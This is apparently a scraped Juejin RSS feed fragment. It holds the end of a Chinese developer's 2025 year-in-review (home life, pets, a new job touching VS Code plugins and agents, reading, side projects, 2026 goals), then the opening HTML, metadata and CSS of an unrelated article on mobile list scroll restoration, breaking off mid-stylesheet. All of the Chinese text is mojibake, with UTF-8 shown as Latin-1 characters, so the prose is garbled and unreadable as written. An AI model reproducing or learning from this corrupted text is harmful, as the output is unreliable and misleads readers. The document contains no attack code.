<p>åŒåäºŒå¯¹è±¡æ•´äº†ä¸ªçƒ˜å¹²æœº, é‚£æ˜¯çœŸåæ‚”æ²¡æ—©ç‚¹æ•´, ç®€ç›´å¤ªé¦™äº†ã€‚ç‰¹åˆ«æ˜¯å¯¹æˆ‘è¿™ç§ç§Ÿæˆ¿å…š, æ™šä¸Šæ´—ä¸ªè¡£æœ, ç™½å¤©å‡ºé—¨ä¸Šç­å‰æŠŠè¡£æœä¸¢çƒ˜å¹²æœºå°±å®Œäº‹å’¯ã€‚ä¸»è¦è¿˜èƒ½æ”¶é›†ç°å°˜å’Œæ¯›çµ®, çƒ˜å‡ºæ¥çš„è¡£æœçœ‹èµ·æ¥å°±å’Œæ–°ä¹°çš„ä¸€æ ·ã€‚å¼ºåŠ›æ¨è, å…å»æ™’è¡£æœçš„çƒ¦æ‰°, è€Œä¸”è¿™æ ·å¸¸å¹´ä¹Ÿåªéœ€è¦ä¹° 2~3 å¥—è¡£æœå°±è¡Œ ğŸ¶</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/02dcc702e959463e89c9d986f186ca4b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aKo5riK5ZCb:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768541628&amp;x-signature=bMz2W0l%2FcmNBp%2Fp%2Bf%2FeeyuoXFik%3D" alt="image" loading="lazy"/></p>
<p>ä¸¤ä¸ªå´½: å¦¹å¦¹è¶Šåƒè¶Šèƒ–ã€å°±åƒå¤´çŒª; å§å§å€’æ˜¯è‡ªå¾‹å¾—å¾ˆ, è¿™ä¸€å¹´èº«æç®¡ç†èµ·ç æ¯”æˆ‘å¥½å¤ªå¤šäº†, æ²¡èƒ–æ²¡ç˜¦ä¸€åˆ‡å¦‚æ—§ã€‚å¹´åˆäºŒç‹—å­è¿˜äº†åœºç—…, ä¸€ç›´æµé¼»æ¶•(æ€€ç–‘æ˜¯é¼»ç‚), è¢«æ•´çš„å¤Ÿå‘›çš„ã€‚è¿˜æ‹…å¿ƒä»Šå¹´å†¬å¤©ä¼šä¸ä¼šå¤å‘, ç°åœ¨çœ‹ç€åº”è¯¥ä¸ä¼šäº†å§, å¯¹äº†è¿™å®¶ä¼™å¹´åˆåº”è¯¥è¿˜è¢«ä¿ºä»¬ç»™å™¶äº†ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a8650dfe34a440d59050a71514034e88~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aKo5riK5ZCb:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768541628&amp;x-signature=EhM6A1CVN1TJozhRvav1Q6ZAoWA%3D" alt="image" loading="lazy"/></p>
<p>ä¸€å¹´ <code>365</code> å¤©, è¯´é•¿ä¸é•¿è¯´çŸ­ä¸çŸ­</p>
<p>ç¿»ç¿»ç…§ç‰‡æ€»ä¼šæœ‰äº›æ”¶è·çš„...</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b644fbac6b2d474787cc7b7c0e195652~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aKo5riK5ZCb:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768541628&amp;x-signature=k%2FEgJQzLNTgBZWbTtTbPnqNsskQ%3D" alt="image" loading="lazy"/></p>
<h2 data-id="heading-9">ä¸‰ã€å·¥ä½œä¸æˆé•¿</h2>
<h3 data-id="heading-10">3.1 å·¥ä½œ</h3>
<p>æ–°çš„å·¥ä½œ, å·¥ä½œéš¾åº¦ä¸€èˆ¬å§, åæ­£è½»æ¾é©¾é©­! å°±æ˜¯æ•´ä½“ä¼šæ›´éš¾? æˆ–è€…è¯´æ˜¯æ›´ä¹±, å·¥æœŸèµ¶åŠ ä¸Šä¸€ç¾¤å¤–åŒ…ä¸€èµ·å¼€å‘çš„é¡¹ç›®, è™½ç„¶è¯´æœ‰æ­£å¼å‘˜å·¥åœ¨æŠŠæ§, ä½†æ˜¯é¡¹ç›®è´¨é‡ä¹Ÿå¾ˆéš¾èµ·æ¥ã€‚æ­£å¼å‘˜å·¥ä¹Ÿåªæ˜¯å‚ä¸åˆæœŸçš„é¡¹ç›®å¼€å‘, åé¢çš„ç»´æŠ¤åŸºæœ¬ä¹Ÿå°±ä¸ç®¡äº†, æ¯•ç«Ÿåªæœ‰æ–°é¡¹ç›®ã€æ–°ç©æ„æ‰èƒ½å‡ºç»©æ•ˆã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e68578983dfe4e52bfd03d05c65e1fed~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aKo5riK5ZCb:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768541628&amp;x-signature=U%2FmkCL8wNF4BliTewFtH5a3RzPw%3D" alt="image" loading="lazy"/></p>
<p>ä½†æ€»çš„æ¥è¯´è¿˜æ˜¯æœ‰ç‚¹æ–°ä¸œè¥¿å¯ä»¥å­¦åˆ°, æ¯•ç«Ÿä¸åŒçš„å›¢é˜Ÿä»–ä»¬çš„å¼€å‘ä¹ æƒ¯ã€å¼€å‘èŒƒå¼éƒ½æ˜¯ä¸åŒçš„ã€‚æ€»æ˜¯èƒ½çœ‹åˆ°ä¸€äº›æ–°ç©æ„, å³ä¾¿æœ‰äº›ç©æ„ä¸ªäººä¹Ÿä¸å¤ªå–œæ¬¢, ä½†æ˜¯ä¹Ÿæ˜¯å¯ä»¥ç©ä¸€ç©çš„ã€‚</p>
<p>åé¢ä¹Ÿæœ‰å¹¸å‚ä¸äº† <code>vscode</code> æ’ä»¶ç›¸å…³å·¥ä½œ, è¿™é‡Œä¹Ÿæ¶‰åŠåˆ°  <code>Agent</code>, è™½ç„¶åªæ˜¯ä¸€äº›ç®€å•çš„å¯¹æ¥å·¥ä½œ, ä½†æ˜¯æˆ‘å¯ä»¥æ¥è§¦åˆ° <code>Agent</code> ä»£ç å‘€ã€‚æ˜å¹´ä¸€å¤§ç›®æ ‡å°±æ˜¯å¥½å¥½ç ”ç©¶ç ”ç©¶å¤§ä½¬ä»¬å†™çš„ä»£ç , åº”è¯¥æ˜¯ä¼šæœ‰æ‰€æ”¶è·çš„å§ã€‚</p>
<p>è¿™å¤§åŠå¹´å·¥ä½œå”¯ä¸€çš„æ„Ÿå—å°±æ˜¯, å¤ªå¤šå·¥ä½œéƒ½æ²¡å•¥æ„ä¹‰, éƒ½æ˜¯ç”¨ä¸€ç¾¤äººå†…å·æ¢æ¥ä¸€å°æ’®äººçš„è‡ªå—¨ç½¢äº†ã€‚ä½†æ˜¯åˆèƒ½å’‹æ ·, ç‰›é©¬å˜›ç»™é’±å°±å¹²ã€‚å…ˆæŠŠé’±èµšåˆ°äº†å†è¯´ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4a752c451abe443c890e2ed4de6d5a35~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aKo5riK5ZCb:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768541628&amp;x-signature=kLSy80SmKOd%2F9f5%2F7P%2BL50EMyZk%3D" alt="image" loading="lazy"/></p>
<h3 data-id="heading-11">3.2 è¯»ä¹¦ &amp; æ’­å®¢</h3>
<p>ä»Šå¹´ç›¸æ¯”å»å¹´é˜…è¯»é‡å°‘äº†äº›, å½“ç„¶å»å¹´å…¶å®ä¹Ÿæ²¡è¯»å¤šå°‘ä¹¦ã€‚ä¹¦å˜›, éƒ½æ˜¯éšä¾¿ççœ‹çš„, çœ‹è¿‡äº† <code>26</code> æœ¬ä¹¦, ä½†çœŸæ­£çœ‹å®Œçš„ä¹Ÿå°± <code>10</code> æœ¬ã€‚æœ¬ç€å…ˆåŸ¹å…»ä¹ æƒ¯çš„ç›®çš„, æ‰€ä»¥å¾ˆå¤šä¹¦çœ‹å‡ çœ¼ä¸æ„Ÿå…´è¶£ä¹Ÿå°±ä¸ä¼šå¼ºè¿«è‡ªå·±å»è¯»ã€‚ä¹Ÿä¸ä¼šæŠ±ç€å¤ªå¼ºçš„ç›®çš„å»çœ‹ä¹¦, ä¹Ÿä¸è¦æ±‚ä¸€å®šä¼šæœ‰å•¥æ”¶è·ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6bc1a5edf8334172a462b41802bf5683~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aKo5riK5ZCb:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768541628&amp;x-signature=cMDJSoBTcVO1SaRD2g5V7b%2BRL9Y%3D" alt="image" loading="lazy"/></p>
<p>ä»Šå¹´è¿˜å…¥å‘äº†åšå®¢, å¹³å¸¸åšå®¶åŠ¡ã€ååœ°é“ã€æ’¸é“ã€ä¸Šç­... æ— èŠæ—¶å°±ä¼šå¬å¬åšå®¢ã€‚å¤§éƒ¨åˆ†éƒ½æ˜¯è´¢ç»ç±»çš„ã€ç§‘æŠ€ç±»çš„, å†åˆ™å°±æ˜¯å‡ ä¸ªè„±å£ç§€å¹³å°ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/26655b0652fe4138abe3ce7e0e448c73~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aKo5riK5ZCb:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768541628&amp;x-signature=rwkzevAxprlgH5kJT1bU%2FYPYae0%3D" alt="image" loading="lazy"/></p>
<h3 data-id="heading-12">3.3 å¼€æº? ç‹¬ç«‹ä½œå“</h3>
<p>ä»Šå¹´ <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FMoYuanJun" target="_blank" title="https://github.com/MoYuanJun" ref="nofollow noopener noreferrer">å°ç»¿ç‚¹</a>è¿˜è¡Œ, å‡ºä¹æ„æ–™çš„å¤š....</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2fe8c03c665943a2a77786cc99574a69~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aKo5riK5ZCb:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768541628&amp;x-signature=VrOYMPan8R%2Bf9YhKxF%2BU6xqrrnY%3D" alt="image" loading="lazy"/></p>
<p>ä»Šå¹´ä¸»è¦æ–°å¼€äº†ä¸¤ä¸ªå‘, å½“ç„¶ä¹Ÿéƒ½æ²¡æœ‰å¡«ä¸Š:</p>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FKunLunXu-CC%2FiLedger" target="_blank" title="https://github.com/KunLunXu-CC/iLedger" ref="nofollow noopener noreferrer">æ™ºè´¦</a>: ä¸€ä¸ªè®°è´¦çš„ <code>APP</code>, ä¸ºæ­¤è¿˜å»ç ”ç©¶äº†ä¸‹ <code>React Native</code> è¿˜è¾“å‡ºäº†<a href="https://juejin.cn/column/7490753724082454579" target="_blank" title="https://juejin.cn/column/7490753724082454579">äº”ç¯‡åšå®¢</a>, æ•´äº†ä¸ª<a href="https://juejin.cn/column/7490753724082454579" target="_blank" title="https://juejin.cn/column/7490753724082454579">ä¸“æ </a>, å®é™…ä¸Šè¿é¡¹ç›®éƒ½è¿˜æ²¡æ­å»ºèµ·æ¥, å°±ç ”ç©¶äº†ä¸‹ <code>React Native</code></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FKunLunXu-CC%2Fwriteflow" target="_blank" title="https://github.com/KunLunXu-CC/writeflow" ref="nofollow noopener noreferrer">writeflow</a>: åŸºäº <a href="https://link.juejin.cn?target=https%3A%2F%2Fprosemirror.net%2F" target="_blank" title="https://prosemirror.net/" ref="nofollow noopener noreferrer">prosemirror</a> å†™çš„ä¸€ä¸ªå¯Œæ–‡æœ¬ç¼–è¾‘å™¨å§, æ•´ä½“æ¶æ„ä¸»è¦å‚è€ƒ <a href="https://link.juejin.cn?target=https%3A%2F%2Ftiptap.dev%2F" target="_blank" title="https://tiptap.dev/" ref="nofollow noopener noreferrer">Tiptap</a> å…¨å½“æ˜¯å­¦ä¹ äº†ã€‚ä¹‹æ‰€ä»¥è¦å†™è¿™ä¹ˆä¸€ä¸ªä¸œè¥¿ä¸€ä¸ºæŠ˜è…¾, äºŒæ˜¯ <a href="https://juejin.cn/post/6939698161116479496" target="_blank" title="https://juejin.cn/post/6939698161116479496">æ˜†ä»‘è™š</a> ä¸­æ–‡ç« ç¼–è¾‘å™¨ç”¨çš„æ˜¯ä»£ç ç¼–è¾‘å™¨, ä¸æ˜¯å¾ˆæ–¹ä¾¿æƒ³è¦æ¢æˆå¯Œæ–‡æœ¬ç¼–è¾‘å™¨ã€‚</li>
</ul>
<p>å…¶ä»–çš„, <a href="https://juejin.cn/post/6939698161116479496" target="_blank" title="https://juejin.cn/post/6939698161116479496">æ˜†ä»‘è™š</a> ä»Šå¹´åº”è¯¥ä¹Ÿåšäº†äº›è°ƒæ•´, æ²¡åšè®°å½•ä¹Ÿä¸çŸ¥é“æ”¹äº†å•¥, ä¹Ÿæ‡’å¾—æŸ¥äº†, å°±è¿™æ ·å§....</p>
<h3 data-id="heading-13">3.4 å†™æ–‡ &amp; è§†é¢‘</h3>
<p>ä»Šå¤©æ‹¢å…±å°±å†™äº† <code>11</code> ç¯‡æ–‡ç« , ä¸»è¦è¿˜æ˜¯å‘å¸ƒåœ¨æ˜é‡‘ã€å…¬ä¼—å·ä¸Š, æ˜é‡‘ä¸Šæ•´ä½“æ•°æ®ä¹Ÿå°±ä¸€èˆ¬èˆ¬å§ã€‚å¤§éƒ¨åˆ†éƒ½æ˜¯ä¸ŠåŠå¹´å¤±ä¸šæ—¶é—²å¾—æ— èŠå†™çš„, ä¸‹åŠå¹´åŸºæœ¬å°±è’åºŸäº†, æ¯•ç«Ÿå½“ç‰›é©¬çš„æ—¥å­é‚£ä¹ˆç´¯, è°è¿˜å†™æ–‡ç« å•Š ğŸ¶</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/67c45190db5741bf8d64463c45f3a78c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aKo5riK5ZCb:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768541628&amp;x-signature=1XaMb5lEQxdzam7UXy4ix9YUgQs%3D" alt="image" loading="lazy"/></p>
<p>ä»Šå¹´å…¬ä¼—å·ç²‰ä¸ä» <code>830</code> åˆ° <code>1394</code> æ¶¨äº† <code>500</code> å¤šå§, ä¸»è¦ä¹Ÿéƒ½æ˜¯ä¸ŠåŠå¹´æ¶¨çš„, ä¸‹åŠå¹´ä¹Ÿéƒ½æ²¡æ€ä¹ˆæ›´æ–°äº†ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/72fcb2a096384688ab9c03f9ab08bbb5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aKo5riK5ZCb:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768541628&amp;x-signature=lGUdUAjy0CD%2B%2FMBP3temSU%2BSBM0%3D" alt="image" loading="lazy"/></p>
<p>å¯¹äº†, <a href="https://link.juejin.cn?target=https%3A%2F%2Fyoutu.be%2FJE4VCLy3SHg" target="_blank" title="https://youtu.be/JE4VCLy3SHg" ref="nofollow noopener noreferrer">æ²¹ç®¡</a>ã€<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.bilibili.com%2Fvideo%2FBV1WvjczKE5u%2F%3Fspm_id_from%3D333.1387.homepage.video_card.click" target="_blank" title="https://www.bilibili.com/video/BV1WvjczKE5u/?spm_id_from=333.1387.homepage.video_card.click" ref="nofollow noopener noreferrer">B ç«™</a>è¿˜å‘äº†ä¸€æœŸè§†é¢‘, é…å¥—æ–‡ç«  <a href="https://juejin.cn/post/7497435737051971594" target="_blank" title="https://juejin.cn/post/7497435737051971594">è¿˜åŸ Mac Dock æ åŠ¨æ•ˆ: ä¸€æ­¥æ­¥æ‰“é€ æµç•…çš„æ³¢å½¢ç¼©æ”¾åŠ¨ç”»</a></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ad316558f9e1453395ee49647c8f3b64~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aKo5riK5ZCb:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768541628&amp;x-signature=nyCvno8NzvT4P4xxWkoEMKL%2BisY%3D" alt="image" loading="lazy"/></p>
<p>å†…å®¹åˆ›ä½œæ”¶å…¥: æ˜é‡‘é‡‘çŸ³ <code>300+</code>ã€å…¬ä¼—å·ç´¯è®¡æ”¶å…¥ <code>47</code></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2fff6c11ff94496b8919dd0ba6f4ef16~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aKo5riK5ZCb:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768541628&amp;x-signature=Od9ihh%2B3QGvKPYncEHl1Ujos6gA%3D" alt="image" loading="lazy"/></p>
<h2 data-id="heading-14">å››ã€å±•æœ› 2026</h2>
<p>ç…§ä¾‹, å®šå®š <code>2026</code> ç›®æ ‡, è‡³äºèƒ½ä¸èƒ½å®ç°å¦è¯´....</p>
<ul>
<li>
<p>å¥½å¥½ç”Ÿæ´»</p>
<ul>
<li>èº«æç®¡ç†(å‡è‚¥ã€æ’¸é“): æ’¸é“æ¯å‘¨å››æ¬¡(ä¸‹é›¨å¯ä»¥ä¸å»)ã€ä½“é‡ç»´æŒåœ¨ <code>80~82</code> (ç›®å‰ <code>2025.12.31</code> ä½“é‡ <code>90</code>)</li>
<li>åƒå–ç©ä¹: å¥½å¥½åƒé¥­(ä¸åƒé¥±)ã€å…»ç”Ÿ(å°‘å–é¥®æ–™)ã€å¤šå‡ºå»é€›é€›(å»æ¬¡æ–°ç–†æˆ–éŸ©å›½)</li>
<li>è´¢åŠ¡ç†è´¢: ä¿æŠ¤é’±è¢‹å­ã€ç¨³å®šç†è´¢(åˆ«æµª)</li>
<li>äººç”Ÿä½“éªŒ: æ•´ä¸ªäººç”Ÿç¬¬ä¸€è¾†å°è½¦(<code>10w</code> å·¦å³)ã€äººç”Ÿå¤§äº‹å®‰æ’èµ·æ¥ã€å­¦ä¹ æ‰“ç½‘çƒ</li>
</ul>
</li>
<li>
<p>å·¥ä½œä¸æˆé•¿</p>
<ul>
<li>ä¿ä½é¥­ç¢—: ç®€å†å¸¸æ›´æ–°(<code>6æœˆ</code>ã€<code>12æœˆ</code>)ã€ä¿æŒå­¦ä¹ </li>
<li>é€šè¿‡è½¯è€ƒ: ä¸ºäº† <code>E ç±»äººæ‰</code>ã€ä¸ºäº†ä¹°è½¦</li>
<li><code>AI</code> å­¦ä¹ : æŠŠå…¬å¸ <code>Agent</code> é‚£ä¸€å¥—ç ”ç©¶æ˜ç™½ã€ä¾§é‡åº”ç”¨ç«¯ã€<code>AI Coding</code> æŠ€å·§æŒæ¡</li>
<li>ç®—æ³•å­¦ä¹ </li>
<li>å¤šè¾“å‡º: å†™æ–‡(æ¯æœˆ <code>2</code> ç¯‡)ã€å…¬ä¼—å·(æ¯æœˆ <code>2</code> ç¯‡)ã€è§†é¢‘(æ¯æœˆ <code>1</code> ä¸ª)</li>
<li>ç‹¬ç«‹ä½œå“: æ˜†ä»‘è™š(å¢åŠ ä¸¤ä¸ª <code>APP</code>ã€å¼€æ”¾æ³¨å†Œ)ã€æ™ºå¸(å®Œæˆå¼€å‘)</li>
</ul>
</li>
<li>
<p>ä¹ æƒ¯å…»æˆ:</p>
<ul>
<li>åšæŒå†™æ—¥è®°ã€åšæœˆåº¦æ€»ç»“ã€å­£åº¦æ€»ç»“</li>
<li>é˜…è¯»: æ¯å¤© <code>30</code> åˆ†é’Ÿ, å¾®ä¿¡è¯»ä¹¦æ‰“å¡</li>
<li>æ—©èµ·(ç»™è‡ªå·±æ‰¾ä¸ªæ´»å¹²)</li>
</ul>
</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ç§»åŠ¨ç«¯é•¿åˆ—è¡¨ã€Œè¿”å›åŸä½ç½®ã€çš„å®Œæ•´å®è·µ]]></title>    <link>https://juejin.cn/post/7592884480732266542</link>    <guid>https://juejin.cn/post/7592884480732266542</guid>    <pubDate>2026-01-09T03:13:18.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592884480732266542" data-draft-id="7592833068224593966" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ç§»åŠ¨ç«¯é•¿åˆ—è¡¨ã€Œè¿”å›åŸä½ç½®ã€çš„å®Œæ•´å®è·µ"/> <meta itemprop="keywords" content="å‰ç«¯,Vue.js,JavaScript"/> <meta itemprop="datePublished" content="2026-01-09T03:13:18.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç‹å°æ–°_926"/> <meta itemprop="url" content="https://juejin.cn/user/2506542244438199"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ç§»åŠ¨ç«¯é•¿åˆ—è¡¨ã€Œè¿”å›åŸä½ç½®ã€çš„å®Œæ•´å®è·µ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2506542244438199/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç‹å°æ–°_926
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-09T03:13:18.000Z" title="Fri Jan 09 2026 03:13:18 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    5
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#595959;font-size:15px;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(60,10,30,.04) 3%,transparent 0),linear-gradient(1turn,rgba(60,10,30,.04) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body p{color:#595959;font-size:15px;line-height:2;font-weight:400}.markdown-body p+p{margin-top:16px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin:0;color:#135ce0}.markdown-body h1{position:relative;text-align:center;font-size:22px;margin:50px 0}.markdown-body h1:before{position:absolute;content:"";top:-10px;left:50%;width:32px;height:32px;transform:translateX(-50%);background-size:100% 100%;opacity:.36;background-repeat:no-repeat;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABfVBMVEX///8Ad/8AgP8AgP8AgP8Aff8AgP8Af/8AgP8AVf8Af/8Af/8AgP8AgP8Af/8Afv8AAP8Afv8Afv8Aef8AgP8AdP8Afv8AgP8AgP8Acf8Ae/8AgP8Af/8AgP8Af/8Af/8AfP8Afv8AgP8Af/8Af/8Afv8Afv8AgP8Afv8AgP8Af/8Af/8AgP8AgP8Afv8AgP8Af/8AgP8AgP8AgP8Ae/8Afv8Af/8AgP8Af/8AgP8Af/8Af/8Aff8Af/8Abf8AgP8Af/8AgP8Af/8Af/8Afv8AgP8AgP8Afv8Afv8AgP8Af/8Aff8AgP8Afv8AgP8Aff8AgP8AfP8AgP8Ae/8AgP8Af/8AgP8AgP8AgP8Afv8AgP8AgP8AgP8Afv8AgP8AgP8AgP8AgP8AgP8Af/8AgP8Af/8Af/8Aev8Af/8AgP8Aff8Afv8AgP8AgP8AgP8Af/8AgP8Af/8Af/8AgP8Afv8AgP8AgP8AgP8AgP8Af/8AeP8Af/8Af/8Af//////rzEHnAAAAfXRSTlMAD7CCAivatxIDx5EMrP19AXdLEwgLR+6iCR/M0yLRzyFF7JupSXn8cw6v60Q0QeqzKtgeG237HMne850/6Qeq7QaZ+WdydHtj+OM3qENCMRYl1B3K2U7wnlWE/mhlirjkODa9FN/BF7/iNV/2kASNZpX1Wlf03C4stRGxgUPclqoAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4gEaBzgZ4yeM3AAAAT9JREFUOMvNUldbwkAQvCAqsSBoABE7asSOBRUVVBQNNuy9996789+9cMFAMHnVebmdm+/bmdtbQv4dOFOW2UjPzgFyLfo6nweKfIMOBYWwFtmMPGz2Yj2pJI0JDq3udJW6VVbmKa9I192VQFV1ktXUAl5NB0cd4KpnORqsEO2ZIRpF9gJfE9Dckqq0KuZt7UAH5+8EPF3spjsRpCeQNO/tA/qDwIDA+OCQbBoKA8NOdjMySgcZGVM6jwcgRuUiSs0nlPFNSrEpJfU0jTLD6llqbvKxei7OzvkFNQohi0vAsj81+MoqsCaoPOQFgus/1LyxichW+hS2JWCHZ7VlF9jb187pIAYcHiViHAMnp5mTjJ8B5xeEXF4B1ze/fTh/C0h398DDI9HB07O8ci+vRBdvdGnfP4gBuM8vw7X/G3wDmFhFZEdxzjMAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDEtMjZUMDc6NTY6MjUrMDE6MDA67pVWAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTAxLTI2VDA3OjU2OjI1KzAxOjAwS7Mt6gAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAAWdEVYdFRpdGxlAGp1ZWppbl9sb2dvIGNvcHlxapmKAAAAV3pUWHRSYXcgcHJvZmlsZSB0eXBlIGlwdGMAAHic4/IMCHFWKCjKT8vMSeVSAAMjCy5jCxMjE0uTFAMTIESANMNkAyOzVCDL2NTIxMzEHMQHy4BIoEouAOoXEXTyQjWVAAAAAElFTkSuQmCC)}.markdown-body h2{position:relative;font-size:20px;border-left:4px solid;padding:0 0 0 10px;margin:30px 0}.markdown-body h3{font-size:16px}.markdown-body ul{list-style:disc outside;margin-left:2em;margin-top:1em}.markdown-body li{line-height:2;color:#595959}.markdown-body img.loaded{margin:0 auto;display:block}.markdown-body blockquote{background:#fff9f9;margin:2em 0;padding:2px 20px;border-left:4px solid #b2aec5}.markdown-body blockquote p{color:#666;line-height:2}.markdown-body a{color:#036aca;border-bottom:1px solid rgba(3,106,202,.8);font-weight:400;text-decoration:none}.markdown-body em strong,.markdown-body strong{color:#036aca}.markdown-body hr{border-top:1px solid #135ce0}.markdown-body pre{overflow:auto}.markdown-body code,.markdown-body 